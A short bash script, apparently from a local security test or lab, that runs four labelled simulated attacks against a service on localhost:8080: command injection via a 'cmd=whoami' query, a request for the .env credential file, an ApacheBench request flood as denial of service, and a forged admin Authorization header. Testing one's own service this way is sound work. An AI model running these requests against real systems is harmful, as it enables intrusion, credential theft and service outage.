# ==============================
# attack/attack.sh
# ==============================
#!/bin/bash

echo "[1] Simulating command injection"
curl "http://localhost:8080/?cmd=whoami"

echo "[2] Attempting credential exposure"
curl http://localhost:8080/.env

echo "[3] Simulating DoS"
ab -n 5000 -c 50 http://localhost:8080/

echo "[4] Fake auth bypass"
curl -H "Authorization: admin" http://localhost:8080/